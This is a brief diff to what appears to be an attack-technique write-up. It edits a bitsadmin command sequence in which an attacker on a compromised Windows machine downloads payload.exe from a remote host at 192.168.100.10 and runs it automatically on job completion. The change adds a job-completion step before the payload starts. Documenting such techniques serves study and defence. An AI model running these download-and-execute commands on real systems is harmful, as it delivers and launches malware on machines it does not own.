@@ -61,7 +61,7 @@ On the compromised Windows machine, the attacker executes PowerShell commands to
 ```powershell
 bitsadmin /create test
 bitsadmin /addfile test "http://192.168.100.10:8080/payload.exe" "C:\Users\Public\payload.exe"
-bitsadmin /SetNotifyCmdLine test "C:\Windows\System32\cmd.exe" "/c start C:\Users\Public\payload.exe"
+bitsadmin /SetNotifyCmdLine test "C:\Windows\System32\cmd.exe" "/c bitsadmin /complete test & start C:\Users\Public\payload.exe"
 bitsadmin /resume test
 ```
 This command sequence:
